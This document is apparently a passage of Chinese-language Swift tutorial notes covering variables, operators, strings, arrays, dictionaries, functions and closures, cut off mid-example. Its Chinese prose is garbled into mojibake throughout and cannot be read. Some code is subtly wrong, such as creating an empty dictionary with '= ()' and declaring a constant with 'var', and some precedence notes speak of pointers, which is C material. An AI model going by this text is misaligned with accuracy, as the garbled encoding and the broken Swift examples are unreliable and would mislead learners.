åœ¨å¼€å‘çš„æ—¶å€™å°½æ—©å‘ç°å¹¶ä¿®å¤é”™è¯¯ã€‚ ç±»å‹æ¨æ–­ ä¸éœ€è¦æ¯æ¬¡å£°æ˜å¸¸é‡å’Œå˜é‡çš„æ—¶å€™éƒ½æ˜¾å¼æŒ‡å®šç±»å‹ å¦‚æœä½ æ²¡æœ‰æ˜¾å¼æŒ‡å®šç±»å‹ï¼ŒSwift ä¼šä½¿ç”¨ç±»å‹æ¨æ–­ï¼ˆtype inferenceï¼‰æ¥é€‰æ‹©åˆé€‚çš„ç±»å‹ã€‚ å½“æ¨æ–­æµ®ç‚¹æ•°çš„ç±»å‹æ—¶ï¼ŒSwift æ€»æ˜¯ä¼šé€‰æ‹©Doubleè€Œä¸æ˜¯Floatã€‚ å¦‚æœè¡¨è¾¾å¼ä¸­åŒæ—¶å‡ºç°äº†æ•´æ•°å’Œæµ®ç‚¹æ•°ï¼Œä¼šè¢«æ¨æ–­ä¸ºDoubleç±»å‹ Swift å˜é‡ å˜é‡æ˜¯ä¸€ç§ä½¿ç”¨æ–¹ä¾¿çš„å ä½ç¬¦ï¼Œç”¨äºå¼•ç”¨è®¡ç®—æœºå†…å­˜åœ°å€ã€‚ å£°æ˜: var variableName = <initial value> var varB:Float å˜é‡åå¯ä»¥ç”±å­—æ¯ï¼Œæ•°å­—å’Œä¸‹åˆ’çº¿ç»„æˆ å˜é‡åéœ€è¦ä»¥å­—æ¯æˆ–ä¸‹åˆ’çº¿å¼€å§‹ åŒºåˆ†å¤§å°å†™ Swift å¸¸é‡ è®¾å®šåä¸å¯å˜ å£°æ˜å¸¸é‡æˆ–è€…å˜é‡çš„æ—¶å€™å¯ä»¥åŠ ä¸Šç±»å‹æ ‡æ³¨ï¼ˆtype annotationï¼‰ï¼Œ è¯´æ˜å¸¸é‡æˆ–è€…å˜é‡ä¸­è¦å­˜å‚¨çš„å€¼çš„ç±»å‹: var constantName:<data type> = <optional initial value> Swift è¿ç®—ç¬¦ ç®—æœ¯è¿ç®—ç¬¦ + - * / % , åˆ†åˆ«è¡¨ç¤º åŠ  å‡ ä¹˜ é™¤ æ±‚ä½™ æ¯”è¾ƒè¿ç®—ç¬¦ == ç­‰äº != ä¸ç­‰äº > å¤§äº < å°äº >= å¤§äºç­‰äº <= å°äºç­‰äº é€»è¾‘è¿ç®—ç¬¦ && é€»è¾‘ä¸ã€‚å¦‚æœè¿ç®—ç¬¦ä¸¤ä¾§éƒ½ä¸º TRUE åˆ™ä¸º TRUEã€‚ || é€»è¾‘æˆ–ã€‚ å¦‚æœè¿ç®—ç¬¦ä¸¤ä¾§è‡³å°‘æœ‰ä¸€ä¸ªä¸º TRUE åˆ™ä¸º TRUEã€‚ ! é€»è¾‘éã€‚å¸ƒå°”å€¼å–åï¼Œä½¿å¾—trueå˜falseï¼Œfalseå˜trueã€‚ ä½è¿ç®—ç¬¦ ä½è¿ç®—ç¬¦ç”¨æ¥å¯¹äºŒè¿›åˆ¶ä½è¿›è¡Œæ“ä½œï¼Œ ~ & | &#94; << >> åˆ†åˆ«ä¸ºå–åï¼ŒæŒ‰ä½ä¸ä¸ï¼ŒæŒ‰ä½ä¸æˆ–ï¼ŒæŒ‰ä½ä¸å¼‚æˆ–è¿ç®—, æŒ‰ä½å·¦ç§»ï¼Œ æŒ‰ä½å³ç§» èµ‹å€¼è¿ç®—ç¬¦ = ç®€å•çš„èµ‹å€¼è¿ç®—ï¼ŒæŒ‡å®šå³è¾¹æ“ä½œæ•°èµ‹å€¼ç»™å·¦è¾¹çš„æ“ä½œæ•° += ç›¸åŠ åå†èµ‹å€¼ï¼Œå°†å·¦å³ä¸¤è¾¹çš„æ“ä½œæ•°ç›¸åŠ åå†èµ‹å€¼ç»™å·¦è¾¹çš„æ“ä½œæ•°ã€‚ -= ç›¸å‡åå†èµ‹å€¼ï¼Œå°†å·¦å³ä¸¤è¾¹çš„æ“ä½œæ•°ç›¸å‡åå†èµ‹å€¼ç»™å·¦è¾¹çš„æ“ä½œæ•°ã€‚ *= ç›¸ä¹˜åå†èµ‹å€¼ï¼Œå°†å·¦å³ä¸¤è¾¹çš„æ“ä½œæ•°ç›¸ä¹˜åå†èµ‹å€¼ç»™å·¦è¾¹çš„æ“ä½œæ•°ã€‚ /= ç›¸é™¤åå†èµ‹å€¼ï¼Œå°†å·¦å³ä¸¤è¾¹çš„æ“ä½œæ•°ç›¸é™¤åå†èµ‹å€¼ç»™å·¦è¾¹çš„æ“ä½œæ•° %= æ±‚ä½™åå†èµ‹å€¼ï¼Œå°†å·¦å³ä¸¤è¾¹çš„æ“ä½œæ•°æ±‚ä½™åå†èµ‹å€¼ç»™å·¦è¾¹çš„æ“ä½œæ•° <<= æŒ‰ä½å·¦ç§»åå†èµ‹å€¼ >>= æŒ‰ä½å³ç§»åå†èµ‹å€¼ &= æŒ‰ä½ä¸è¿ç®—åèµ‹å€¼ &#94;= æŒ‰ä½å¼‚æˆ–è¿ç®—ç¬¦åå†èµ‹å€¼ |= æŒ‰ä½æˆ–è¿ç®—åå†èµ‹å€¼ åŒºé—´è¿ç®—ç¬¦ é—­åŒºé—´è¿ç®—ç¬¦: é—­åŒºé—´è¿ç®—ç¬¦ ï¼ˆa...bï¼‰ å®šä¹‰ä¸€ä¸ªåŒ…å«ä»aåˆ°b(åŒ…æ‹¬aå’Œb)çš„æ‰€æœ‰å€¼çš„åŒºé—´, å¿…é¡»å¤§äºç­‰äºaã€‚ é—­åŒºé—´è¿ç®—ç¬¦åœ¨è¿­ä»£ä¸€ä¸ªåŒºé—´çš„æ‰€æœ‰å€¼æ—¶æ˜¯éå¸¸æœ‰ç”¨çš„ï¼Œ å¦‚åœ¨for-inå¾ªç¯ä¸­: 1...5 åŒºé—´å€¼ä¸º 1, 2, 3, 4 å’Œ 5 åŠå¼€åŒºé—´è¿ç®—ç¬¦ åŠå¼€åŒºé—´ï¼ˆa..<bï¼‰å®šä¹‰ä¸€ä¸ªä»aåˆ°bä½†ä¸åŒ…æ‹¬bçš„åŒºé—´ã€‚ ä¹‹æ‰€ä»¥ç§°ä¸ºåŠå¼€åŒºé—´ï¼Œ æ˜¯å› ä¸ºè¯¥åŒºé—´åŒ…å«ç¬¬ä¸€ä¸ªå€¼è€Œä¸åŒ…æ‹¬æœ€åçš„å€¼ã€‚ å¦‚ï¼š 1..< 5 åŒºé—´å€¼ä¸º 1, 2, 3, å’Œ 4 å…¶ä»–è¿ç®—ç¬¦ å…¶ä»–ç±»å‹çš„çš„è¿ç®—ç¬¦ï¼Œå¦‚ä¸€å…ƒã€äºŒå…ƒå’Œä¸‰å…ƒè¿ç®—ç¬¦ ä¸€å…ƒå‡: æ•°å­—å‰æ·»åŠ  - å·å‰ç¼€, -3 æˆ– -4 ä¸€å…ƒåŠ : æ•°å­—å‰æ·»åŠ  + å·å‰ç¼€, +6 ç»“æœä¸º 6 ä¸‰å…ƒè¿ç®—ç¬¦: condition ? X : Y, å¦‚æœ condition ä¸º true ï¼Œå€¼ä¸º X ï¼Œå¦åˆ™ä¸º Y é‡è¦ è¿ç®—ç¬¦ä¼˜å…ˆçº§ ä¼˜å…ˆçº§ä»ä¸Šåˆ°ä¸‹ä¾æ¬¡é€’å‡ï¼Œæœ€ä¸Šé¢å…·æœ‰æœ€é«˜çš„ä¼˜å…ˆçº§ï¼Œé€—å·æ“ä½œç¬¦å…·æœ‰æœ€ä½çš„ä¼˜å…ˆçº§ã€‚ ç›¸åŒä¼˜å…ˆçº§ä¸­ï¼ŒæŒ‰ç»“åˆé¡ºåºè®¡ç®—ã€‚å¤§å¤šæ•°è¿ç®—æ˜¯ä»å·¦è‡³å³è®¡ç®—ï¼Œåªæœ‰ä¸‰ä¸ªä¼˜å…ˆçº§æ˜¯ä»å³è‡³å·¦ç»“åˆçš„ï¼Œ å®ƒä»¬æ˜¯å•ç›®è¿ç®—ç¬¦ã€æ¡ä»¶è¿ç®—ç¬¦ã€èµ‹å€¼è¿ç®—ç¬¦ã€‚ åŸºæœ¬çš„ä¼˜å…ˆçº§éœ€è¦è®°ä½ï¼š æŒ‡é’ˆæœ€ä¼˜ï¼Œå•ç›®è¿ç®—ä¼˜äºåŒç›®è¿ç®—ã€‚å¦‚æ­£è´Ÿå·ã€‚ å…ˆä¹˜é™¤ï¼ˆæ¨¡ï¼‰ï¼ŒååŠ å‡ã€‚ å…ˆç®—æœ¯è¿ç®—ï¼Œåç§»ä½è¿ç®—ï¼Œæœ€åä½è¿ç®—ã€‚ ç‰¹åˆ«æ³¨æ„ï¼š 1 << 3 + 2 & 7 ç­‰ä»·äº (1 << (3 + 2))&7 é€»è¾‘è¿ç®—æœ€åè®¡ç®— åˆå¹¶ç©ºå€¼è¿ç®—ç¬¦ï¼š?? åˆå¹¶ç©ºå€¼è¿ç®—ç¬¦ a ?? b å¦‚æœå¯é€‰é¡¹ a æœ‰å€¼åˆ™å±•å¼€ï¼Œå¦‚æœæ²¡æœ‰å€¼ï¼Œæ˜¯ nilï¼Œåˆ™è¿”å›é»˜è®¤å€¼ bã€‚ è¡¨è¾¾å¼ a å¿…é¡»æ˜¯ä¸€ä¸ªå¯é€‰ç±»å‹ï¼Œè¡¨è¾¾å¼ b å¿…é¡»ä¸ a çš„å­˜å‚¨ç±»å‹ç›¸åŒ åˆå¹¶ç©ºå€¼è¿ç®—ç¬¦ï¼Œå®é™…ä¸Šæ˜¯ä¸‰å…ƒè¿ç®—ç¬¦ä½œç”¨åˆ° Optional ä¸Šçš„ç¼©å†™ a != nil ? a! : b å¦‚æœ a çš„å€¼æ˜¯éç©ºï¼Œbçš„å€¼å°†ä¸ä¼šè¢«è€ƒè™‘ï¼Œä¹Ÿå°±æ˜¯åˆå¹¶ç©ºå€¼è¿ç®—ç¬¦æ˜¯çŸ­è·¯çš„ã€‚ Swift æ¡ä»¶è¯­å¥ if switch æœ€ç®€ä¾¿çš„å°±æ˜¯ä¸‰ç›®: Exp1 ? Exp2 : Exp3; Swift å¾ªç¯ for-in éå†ä¸€ä¸ªé›†åˆé‡Œé¢çš„æ‰€æœ‰å…ƒç´ ï¼Œä¾‹å¦‚ç”±æ•°å­—è¡¨ç¤ºçš„åŒºé—´ã€æ•°ç»„ä¸­çš„å…ƒç´ ã€å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦ã€‚ for å¾ªç¯ è¯¥å¾ªç¯æ–¹å¼åœ¨ Swift 3 ä¸­å·²ç»å¼ƒç”¨ã€‚ ç”¨æ¥é‡å¤æ‰§è¡Œä¸€ç³»åˆ—è¯­å¥ç›´åˆ°è¾¾æˆç‰¹å®šæ¡ä»¶è¾¾æˆï¼Œ ä¸€èˆ¬é€šè¿‡åœ¨æ¯æ¬¡å¾ªç¯å®Œæˆåå¢åŠ è®¡æ•°å™¨çš„å€¼æ¥å®ç°ã€‚ while å¾ªç¯ è¿è¡Œä¸€ç³»åˆ—è¯­å¥ï¼Œå¦‚æœæ¡ä»¶ä¸ºtrueï¼Œä¼šé‡å¤è¿è¡Œï¼Œç›´åˆ°æ¡ä»¶å˜ä¸ºfalseã€‚ repeat...while å¾ªç¯ ç±»ä¼¼ while è¯­å¥åŒºåˆ«åœ¨äºåˆ¤æ–­å¾ªç¯æ¡ä»¶ä¹‹å‰ï¼Œå…ˆæ‰§è¡Œä¸€æ¬¡å¾ªç¯çš„ä»£ç å—ã€‚ å¾ªç¯æ§åˆ¶è¯­å¥ continue è¯­å¥: å‘Šè¯‰ä¸€ä¸ªå¾ªç¯ä½“ç«‹åˆ»åœæ­¢æœ¬æ¬¡å¾ªç¯è¿­ä»£ï¼Œé‡æ–°å¼€å§‹ä¸‹æ¬¡å¾ªç¯è¿­ä»£ã€‚ break è¯­å¥: ä¸­æ–­å½“å‰å¾ªç¯ã€‚ fallthrough è¯­å¥: å¦‚æœåœ¨ä¸€ä¸ªcaseæ‰§è¡Œå®Œåï¼Œç»§ç»­æ‰§è¡Œä¸‹é¢çš„caseï¼Œ éœ€è¦ä½¿ç”¨fallthrough(è´¯ç©¿)å…³é”®å­—ã€‚ Swift å­—ç¬¦ä¸² åˆ›å»º å¯ä»¥é€šè¿‡ä½¿ç”¨å­—ç¬¦ä¸²å­—é¢é‡æˆ– String ç±»çš„å®ä¾‹æ¥åˆ›å»ºä¸€ä¸ªå­—ç¬¦ä¸²: import Cocoa // ä½¿ç”¨å­—ç¬¦ä¸²å­—é¢é‡ var stringA = \"Hello, World!\" print( stringA ) // String å®ä¾‹åŒ– var stringB = String(\"Hello, World!\") print( stringB ) åˆå§‹åŒ–ç©ºçš„å­—ç¬¦ä¸² å¯ä»¥ä½¿ç”¨ç©ºçš„å­—ç¬¦ä¸²å­—é¢é‡èµ‹å€¼ç»™å˜é‡æˆ–åˆå§‹åŒ–ä¸€ä¸ªStringç±»çš„å®ä¾‹æ¥åˆå§‹å€¼ä¸€ä¸ªç©ºçš„å­—ç¬¦ä¸², ä½¿ç”¨å­—ç¬¦ä¸²å±æ€§ isEmpty æ¥åˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦ä¸ºç©º: import Cocoa // ä½¿ç”¨å­—ç¬¦ä¸²å­—é¢é‡åˆ›å»ºç©ºå­—ç¬¦ä¸² var stringA = \"\" // å®ä¾‹åŒ– String ç±»æ¥åˆ›å»ºç©ºå­—ç¬¦ä¸² // let stringB = String() if stringA.isEmpty { print( \"stringA æ˜¯ç©ºçš„\" ) } else { print( \"stringA ä¸æ˜¯ç©ºçš„\" ) å­—ç¬¦ä¸²ä¸­æ’å…¥å€¼ æ’å…¥çš„å­—ç¬¦ä¸²å­—é¢é‡çš„æ¯ä¸€é¡¹éƒ½åœ¨ä»¥åæ–œçº¿ä¸ºå‰ç¼€çš„åœ†æ‹¬å·ä¸­: import Cocoa var varA = 20 let constA = 100 var varC:Float = 20.0 var stringA = \"\\(varA) ä¹˜äº \\(constA) ç­‰äº \\(varC * 100)\" print( stringA ) å­—ç¬¦ä¸²è¿æ¥ å­—ç¬¦ä¸²å¯ä»¥é€šè¿‡ + å·æ¥è¿æ¥ å­—ç¬¦ä¸²é•¿åº¦ å­—ç¬¦ä¸²é•¿åº¦ä½¿ç”¨ String.count å±æ€§æ¥è®¡ç®— å­—ç¬¦ä¸²æ¯”è¾ƒ ä½¿ç”¨ == æ¥æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰ Unicode å­—ç¬¦ä¸² Unicode æ˜¯ä¸€ä¸ªå›½é™…æ ‡å‡†ï¼Œç”¨äºæ–‡æœ¬çš„ç¼–ç ï¼ŒSwift çš„ String ç±»å‹æ˜¯åŸºäº Unicodeå»ºç«‹çš„ã€‚ ä½ å¯ä»¥å¾ªç¯è¿­ä»£å‡ºå­—ç¬¦ä¸²ä¸­ UTF-8 ä¸ UTF-16 çš„ç¼–ç : import Cocoa var unicodeString = \"èœé¸Ÿæ•™ç¨‹\" print(\"UTF-8 ç¼–ç : \") for code in unicodeString.utf8 { print(\"\\(code) \") } print(\"\\n\") print(\"UTF-16 ç¼–ç : \") for code in unicodeString.utf16 { print(\"\\(code) \") } å­—ç¬¦ä¸²å‡½æ•°åŠè¿ç®—ç¬¦ isEmpty: åˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦ä¸ºç©ºï¼Œè¿”å›å¸ƒå°”å€¼ hasPrefix(prefix: String): æ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦æ‹¥æœ‰ç‰¹å®šå‰ç¼€ hasSuffix(suffix: String): æ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦æ‹¥æœ‰ç‰¹å®šåç¼€ã€‚ Int(String): è½¬æ¢å­—ç¬¦ä¸²æ•°å­—ä¸ºæ•´å‹ String.count: Swift 3 ç‰ˆæœ¬ä½¿ç”¨çš„æ˜¯ String.characters.count, è®¡ç®—å­—ç¬¦ä¸²çš„é•¿åº¦ utf8: æ‚¨å¯ä»¥é€šè¿‡éå† String çš„ utf8 å±æ€§æ¥è®¿é—®å®ƒçš„ UTF-8 ç¼–ç  utf16: æ‚¨å¯ä»¥é€šè¿‡éå† String çš„ utf16 å±æ€§æ¥è®¿é—®å®ƒçš„ utf16 ç¼–ç  unicodeScalars: æ‚¨å¯ä»¥é€šè¿‡éå†Stringå€¼çš„unicodeScalarså±æ€§æ¥è®¿é—®å®ƒçš„ Unicode æ ‡é‡ç¼–ç . +: è¿æ¥ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›ä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸² +=: è¿æ¥æ“ä½œç¬¦ä¸¤è¾¹çš„å­—ç¬¦ä¸²å¹¶å°†æ–°å­—ç¬¦ä¸²èµ‹å€¼ç»™å·¦è¾¹çš„æ“ä½œç¬¦å˜é‡ ==: åˆ¤æ–­ä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰ <: æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œå¯¹ä¸¤ä¸ªå­—ç¬¦ä¸²çš„å­—æ¯é€ä¸€æ¯”è¾ƒã€‚ !=: æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ä¸ç›¸ç­‰ã€‚ Swift å­—ç¬¦(Character) ç©ºå­—ç¬¦å˜é‡ Swift ä¸­ä¸èƒ½åˆ›å»ºç©ºçš„ Characterï¼ˆå­—ç¬¦ï¼‰ ç±»å‹å˜é‡æˆ–å¸¸é‡ éå†å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦ Swift 3 ä¸­çš„ String éœ€è¦é€šè¿‡ characters å»è°ƒç”¨çš„å±æ€§æ–¹æ³•ï¼Œ åœ¨ Swift 4 ä¸­å¯ä»¥é€šè¿‡ String å¯¹è±¡æœ¬èº«ç›´æ¥è°ƒç”¨ï¼Œä¾‹å¦‚: import Cocoa for ch in \"Runoob\" { print(ch) } å­—ç¬¦ä¸²è¿æ¥å­—ç¬¦ ä½¿ç”¨ String çš„ append() æ–¹æ³•æ¥å®ç°å­—ç¬¦ä¸²è¿æ¥å­—ç¬¦ Swift æ•°ç»„ å¦‚æœåˆ›å»ºä¸€ä¸ªæ•°ç»„ï¼Œå¹¶èµ‹å€¼ç»™ä¸€ä¸ªå˜é‡ï¼Œåˆ™åˆ›å»ºçš„é›†åˆå°±æ˜¯å¯ä»¥ä¿®æ”¹çš„ã€‚è¿™æ„å‘³ç€åœ¨åˆ›å»ºæ•°ç»„åï¼Œå¯ä»¥é€šè¿‡æ·»åŠ ã€åˆ é™¤ã€ä¿®æ”¹çš„æ–¹å¼æ”¹å˜æ•°ç»„é‡Œçš„é¡¹ç›®ã€‚ å¦‚æœå°†ä¸€ä¸ªæ•°ç»„èµ‹å€¼ç»™å¸¸é‡ï¼Œæ•°ç»„å°±ä¸å¯æ›´æ”¹ï¼Œå¹¶ä¸”æ•°ç»„çš„å¤§å°å’Œå†…å®¹éƒ½ä¸å¯ä»¥ä¿®æ”¹ã€‚ åˆ›å»ºæ•°ç»„ å¯ä»¥ä½¿ç”¨æ„é€ è¯­æ³•æ¥åˆ›å»ºä¸€ä¸ªç”±ç‰¹å®šæ•°æ®ç±»å‹æ„æˆçš„ç©ºæ•°ç»„ï¼š var someArray = [SomeType]() ä»¥ä¸‹æ˜¯åˆ›å»ºä¸€ä¸ªåˆå§‹åŒ–å¤§å°æ•°ç»„çš„è¯­æ³•: var someArray = [SomeType](repeating: InitialValue, count: NumbeOfElements) ä»¥ä¸‹å®ä¾‹åˆ›å»ºäº†ä¸€ä¸ªç±»å‹ä¸º Int ï¼Œæ•°é‡ä¸º 3ï¼Œåˆå§‹å€¼ä¸º 0 çš„ç©ºæ•°ç»„: var someInts = [Int](repeating: 0, count: 3) ä»¥ä¸‹å®ä¾‹åˆ›å»ºäº†å«æœ‰ä¸‰ä¸ªå…ƒç´ çš„æ•°ç»„: var someInts:[Int] = [10, 20, 30] è®¿é—®æ•°ç»„ æ ¹æ®æ•°ç»„çš„ç´¢å¼•æ¥è®¿é—®æ•°ç»„çš„å…ƒç´ ï¼Œè¯­æ³•å¦‚ä¸‹: var someVar = someArray[index] ä¿®æ”¹æ•°ç»„ å¯ä»¥ä½¿ç”¨ append() æ–¹æ³•æˆ–è€…èµ‹å€¼è¿ç®—ç¬¦ += åœ¨æ•°ç»„æœ«å°¾æ·»åŠ å…ƒç´  ä¹Ÿå¯ä»¥é€šè¿‡ç´¢å¼•ä¿®æ”¹æ•°ç»„å…ƒç´ çš„å€¼ éå†æ•°ç»„ å¯ä»¥ä½¿ç”¨for-inå¾ªç¯æ¥éå†æ‰€æœ‰æ•°ç»„ä¸­çš„æ•°æ®é¡¹ åˆå¹¶æ•°ç»„ å¯ä»¥ä½¿ç”¨åŠ æ³•æ“ä½œç¬¦ï¼ˆ+ï¼‰æ¥åˆå¹¶ä¸¤ç§å·²å­˜åœ¨çš„ç›¸åŒç±»å‹æ•°ç»„ count å±æ€§ ä½¿ç”¨ count å±æ€§æ¥è®¡ç®—æ•°ç»„å…ƒç´ ä¸ªæ•° isEmpty å±æ€§ é€šè¿‡åªè¯»å±æ€§ isEmpty æ¥åˆ¤æ–­æ•°ç»„æ˜¯å¦ä¸ºç©º æ³¨è§£ åˆ›å»ºæ•°ç»„çš„æ–¹æ³• æ¨è: var names: [String] = [] var lookup: [String: Int] = [:] ä¸æ¨è: var names = [String]() var lookup = [String: Int]() Swift å­—å…¸ Swift å­—å…¸ç”¨æ¥å­˜å‚¨æ— åºçš„ç›¸åŒç±»å‹æ•°æ®çš„é›†åˆï¼ŒSwift å­—å…¸ä¼šå¼ºåˆ¶æ£€æµ‹å…ƒç´ çš„ç±»å‹ï¼Œå¦‚æœç±»å‹ä¸åŒåˆ™ä¼šæŠ¥é”™ã€‚ Swift å­—å…¸æ¯ä¸ªå€¼ï¼ˆvalueï¼‰éƒ½å…³è”å”¯ä¸€çš„é”®ï¼ˆkeyï¼‰ï¼Œé”®ä½œä¸ºå­—å…¸ä¸­çš„è¿™ä¸ªå€¼æ•°æ®çš„æ ‡è¯†ç¬¦ å¦‚æœåˆ›å»ºä¸€ä¸ªå­—å…¸ï¼Œå¹¶èµ‹å€¼ç»™ä¸€ä¸ªå˜é‡ï¼Œåˆ™åˆ›å»ºçš„å­—å…¸å°±æ˜¯å¯ä»¥ä¿®æ”¹çš„ã€‚è¿™æ„å‘³ç€åœ¨åˆ›å»ºå­—å…¸åï¼Œå¯ä»¥é€šè¿‡æ·»åŠ ã€åˆ é™¤ã€ä¿®æ”¹çš„æ–¹å¼æ”¹å˜å­—å…¸é‡Œçš„é¡¹ç›®ã€‚ å¦‚æœå°†ä¸€ä¸ªå­—å…¸èµ‹å€¼ç»™å¸¸é‡ï¼Œå­—å…¸å°±ä¸å¯ä¿®æ”¹ï¼Œå¹¶ä¸”å­—å…¸çš„å¤§å°å’Œå†…å®¹éƒ½ä¸å¯ä»¥ä¿®æ”¹ã€‚ åˆ›å»ºå­—å…¸ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è¯­æ³•æ¥åˆ›å»ºä¸€ä¸ªç‰¹å®šç±»å‹çš„ç©ºå­—å…¸: // var someDict = [KeyType: ValueType]() var someDict: [KeyType: ValueType] = () ä»¥ä¸‹æ˜¯åˆ›å»ºä¸€ä¸ªç©ºå­—å…¸ï¼Œé”®çš„ç±»å‹ä¸º Intï¼Œå€¼çš„ç±»å‹ä¸º String çš„ç®€å•è¯­æ³•: // var someDict = [Int: String]() var someDict: [Int: String] = () ä»¥ä¸‹ä¸ºåˆ›å»ºä¸€ä¸ªå­—å…¸çš„å®ä¾‹: var someDict:[Int:String] = [1:\"One\", 2:\"Two\", 3:\"Three\"] è®¿é—®å­—å…¸ æˆ‘ä»¬å¯ä»¥æ ¹æ®å­—å…¸çš„ç´¢å¼•æ¥è®¿é—®æ•°ç»„çš„å…ƒç´ ï¼Œè¯­æ³•å¦‚ä¸‹: var someVar = someDict[key] ä¿®æ”¹å­—å…¸ å¯ä»¥ä½¿ç”¨ updateValue(forKey:) å¢åŠ æˆ–æ›´æ–°å­—å…¸çš„å†…å®¹ã€‚ å¦‚æœ key ä¸å­˜åœ¨ï¼Œåˆ™æ·»åŠ å€¼ï¼Œå¦‚æœå­˜åœ¨åˆ™ä¿®æ”¹ key å¯¹åº”çš„å€¼ã€‚ updateValue(_:forKey:)æ–¹æ³•è¿”å›è¢«ä¿®æ”¹çš„Optionalå€¼ ä¹Ÿå¯ä»¥é€šè¿‡æŒ‡å®šçš„ key æ¥ä¿®æ”¹å­—å…¸çš„å€¼ ç§»é™¤ Key-Value å¯¹ å¯ä»¥ä½¿ç”¨ removeValueForKey() æ–¹æ³•æ¥ç§»é™¤å­—å…¸ key-value å¯¹ å¦‚æœ key å­˜åœ¨è¯¥æ–¹æ³•è¿”å›ç§»é™¤çš„å€¼ï¼Œå¦‚æœä¸å­˜åœ¨è¿”å› nil éå†å­—å…¸ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ for-in å¾ªç¯æ¥éå†æŸä¸ªå­—å…¸ä¸­çš„é”®å€¼å¯¹: import Cocoa var someDict:[Int:String] = [1:\"One\", 2:\"Two\", 3:\"Three\"] for (key, value) in someDict { print(\"å­—å…¸ key \\(key) - å­—å…¸ value \\(value)\") } å­—å…¸è½¬æ¢ä¸ºæ•°ç»„ å¯ä»¥æå–å­—å…¸çš„é”®å€¼(key-value)å¯¹ï¼Œå¹¶è½¬æ¢ä¸ºç‹¬ç«‹çš„æ•°ç»„: import Cocoa var someDict:[Int:String] = [1:\"One\", 2:\"Two\", 3:\"Three\"] let dictKeys = [Int](someDict.keys) let dictValues = [String](someDict.values) count å±æ€§ å¯ä»¥ä½¿ç”¨åªè¯»çš„ count å±æ€§æ¥è®¡ç®—å­—å…¸æœ‰å¤šå°‘ä¸ªé”®å€¼å¯¹ isEmpty å±æ€§ å¯ä»¥é€šè¿‡åªè¯»å±æ€§ isEmpty æ¥åˆ¤æ–­å­—å…¸æ˜¯å¦ä¸ºç©º Swift å‡½æ•° å‡½æ•°å®šä¹‰: func funcname(å½¢å‚) -> returntype { Statement1 Statement2 â€¦â€¦ Statement N return parameters } å¯å˜å‚æ•° å¯å˜å‚æ•°å¯ä»¥æ¥å—é›¶ä¸ªæˆ–å¤šä¸ªå€¼. é€šè¿‡åœ¨å˜é‡ç±»å‹ååé¢åŠ å…¥ï¼ˆ...ï¼‰çš„æ–¹å¼æ¥å®šä¹‰ å¸¸é‡ï¼Œå˜é‡åŠ I/O å‚æ•° ä¸€èˆ¬é»˜è®¤åœ¨å‡½æ•°ä¸­å®šä¹‰çš„å‚æ•°éƒ½æ˜¯å¸¸é‡å‚æ•°ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªå‚æ•°ä½ åªå¯ä»¥æŸ¥è¯¢ä½¿ç”¨ï¼Œä¸èƒ½æ”¹å˜å®ƒçš„å€¼ã€‚ å¦‚æœæƒ³è¦å£°æ˜ä¸€ä¸ªå˜é‡å‚æ•°ï¼Œå¯ä»¥åœ¨å‚æ•°å®šä¹‰å‰åŠ  inout å…³é”®å­—ï¼Œè¿™æ ·å°±å¯ä»¥æ”¹å˜è¿™ä¸ªå‚æ•°çš„å€¼äº† ä¾‹å¦‚: func getName(_ name: inout String)......... ä¸€èˆ¬é»˜è®¤çš„å‚æ•°ä¼ é€’éƒ½æ˜¯ä¼ å€¼è°ƒç”¨çš„ï¼Œè€Œä¸æ˜¯ä¼ å¼•ç”¨ã€‚æ‰€ä»¥ä¼ å…¥çš„å‚æ•°åœ¨å‡½æ•°å†…æ”¹å˜ï¼Œå¹¶ä¸å½±å“åŸæ¥çš„é‚£ä¸ªå‚æ•°ã€‚ä¼ å…¥çš„åªæ˜¯è¿™ä¸ªå‚æ•°çš„å‰¯æœ¬ã€‚ å½“ä¼ å…¥çš„å‚æ•°ä½œä¸ºè¾“å…¥è¾“å‡ºå‚æ•°æ—¶ï¼Œéœ€è¦åœ¨å‚æ•°åå‰åŠ  & ç¬¦ï¼Œè¡¨ç¤ºè¿™ä¸ªå€¼å¯ä»¥è¢«å‡½æ•°ä¿®æ”¹ã€‚ å®ä¾‹: import Cocoa func swapTwoInts(_ a: inout Int, _ b: inout Int) { let temporaryA = a a = b b = temporaryA } var x = 1 var y = 5 swapTwoInts(&x, &y) print(\"x ç°åœ¨çš„å€¼ \\(x), y ç°åœ¨çš„å€¼ \\(y)\") ä½¿ç”¨å‡½æ•°ç±»å‹ å¯ä»¥å®šä¹‰ä¸€ä¸ªç±»å‹ä¸ºå‡½æ•°çš„å¸¸é‡æˆ–å˜é‡ï¼Œå¹¶å°†é€‚å½“çš„å‡½æ•°èµ‹å€¼ç»™å®ƒ: var addition: (Int, Int) -> Int = sum Swift é—­åŒ… é—­åŒ…(Closures)æ˜¯è‡ªåŒ…å«çš„åŠŸèƒ½ä»£ç å—ï¼Œå¯ä»¥åœ¨ä»£ç ä¸­ä½¿ç”¨æˆ–è€…ç”¨æ¥ä½œä¸ºå‚æ•°ä¼ å€¼ã€‚ Swift ä¸­çš„é—­åŒ…ä¸ C å’Œ Objective-C ä¸­çš„ä»£ç å—ï¼ˆblocksï¼‰ä»¥åŠå…¶ä»–ä¸€äº›ç¼–ç¨‹è¯­è¨€ä¸­çš„ åŒ¿åå‡½æ•°æ¯”è¾ƒç›¸ä¼¼ã€‚ å…¨å±€å‡½æ•°å’ŒåµŒå¥—å‡½æ•°å…¶å®å°±æ˜¯ç‰¹æ®Šçš„é—­åŒ… å¤§å¤šæ•°æƒ…å†µä¸‹, Swiftçš„é—­åŒ…ç›¸å½“äºåŒ¿åå‡½æ•°, æ¯”å¦‚: let driver = { print(\"is 